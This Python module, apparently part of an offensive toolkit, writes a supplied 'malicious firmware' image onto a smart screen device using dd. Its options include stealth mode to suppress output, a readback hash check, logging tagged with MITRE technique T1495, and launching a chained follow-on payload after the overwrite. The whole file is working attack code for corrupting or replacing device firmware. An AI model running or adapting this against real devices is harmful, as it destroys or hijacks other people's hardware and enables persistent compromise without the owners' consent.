# modules/attacks/screen_firmware_overwriter.py

import os
import argparse
import subprocess
from datetime import datetime
import json
from hashlib import sha256

LOG_PATH = "results/firmware_attack_logs.json"
MITRE_TTP = "T1495"

def log_overwrite(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_PATH):
        with open(LOG_PATH, "r") as f:
            data = json.load(f)
    else:
        data = []
    data.append(entry)
    with open(LOG_PATH, "w") as f:
        json.dump(data, f, indent=2)

def verify_device(device_path):
    try:
        output = subprocess.check_output(["lsblk", "-o", "NAME,TYPE,MOUNTPOINT"], text=True)
        if "disk" not in output and "loop" not in output:
            raise ValueError("Target does not appear to be a valid device")
        if "/dev/sda" in device_path or "/dev/root" in device_path:
            raise ValueError("Refusing to overwrite system-critical device")
    except Exception as e:
        raise RuntimeError(f"Device validation failed: {e}")

def backup_device(device_path, backup_path):
    try:
        print(f"[+] Backing up {device_path} to {backup_path}")
        subprocess.run(["dd", f"if={device_path}", f"of={backup_path}", "bs=1M", "conv=fsync"], check=True)
        print(f"[✓] Backup complete")
    except subprocess.CalledProcessError:
        print(f"[!] Backup failed")

def overwrite_firmware(device_path, malicious_fw, stealth=False):
    if not os.path.exists(device_path):
        raise FileNotFoundError(f"Device path not found: {device_path}")
    if not os.path.exists(malicious_fw):
        raise FileNotFoundError(f"Firmware file missing: {malicious_fw}")

    try:
        subprocess.run(["dd", f"if={malicious_fw}", f"of={device_path}", "bs=1M", "conv=fsync"], check=True)
        if not stealth:
            print(f"[✓] Firmware written to {device_path}")
    except subprocess.CalledProcessError as e:
        print(f"[!] Firmware overwrite failed: {e}")
        return False
    return True

def verify_integrity(device_path, firmware_path):
    try:
        fw_data = open(firmware_path, "rb").read()
        readback = subprocess.check_output(["dd", f"if={device_path}", "bs=1M", "count=1"], stderr=subprocess.DEVNULL)
        return sha256(readback).hexdigest() == sha256(fw_data).hexdigest()
    except Exception:
        return False

def execute(device_path, fw_image, stealth=False, backup=False, chain=None):
    fw_hash = sha256(open(fw_image, "rb").read()).hexdigest()

    verify_device(device_path)

    if backup:
        backup_path = f"{device_path}.bak"
        backup_device(device_path, backup_path)

    success = overwrite_firmware(device_path, fw_image, stealth)

    verified = verify_integrity(device_path, fw_image) if success else False

    log_overwrite({
        "timestamp": datetime.utcnow().isoformat(),
        "device_path": device_path,
        "firmware_used": fw_image,
        "sha256": fw_hash,
        "verified": verified,
        "backup_taken": backup,
        "chained_payload": chain,
        "stealth": stealth,
        "success": success,
        "ttp": MITRE_TTP
    })

    if success and verified:
        print(f"[✓] Firmware overwrite complete and verified. SHA256: {fw_hash}")
        if chain:
            print(f"[+] Chaining to {chain}...")
            subprocess.Popen(["python3", chain])
    else:
        print("[!] Firmware overwrite failed or integrity mismatch")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Smart Screen Firmware Overwriter")
    parser.add_argument("--device", required=True, help="Path to screen device mount (e.g., /dev/sdX)")
    parser.add_argument("--firmware", required=True, help="Malicious firmware binary to write")
    parser.add_argument("--stealth", action="store_true", help="Silent mode, suppress output")
    parser.add_argument("--backup", action="store_true", help="Backup device before overwrite")
    parser.add_argument("--chain", help="Optional payload to launch after overwrite")
    args = parser.parse_args()

    execute(args.device, args.firmware, args.stealth, args.backup, args.chain)
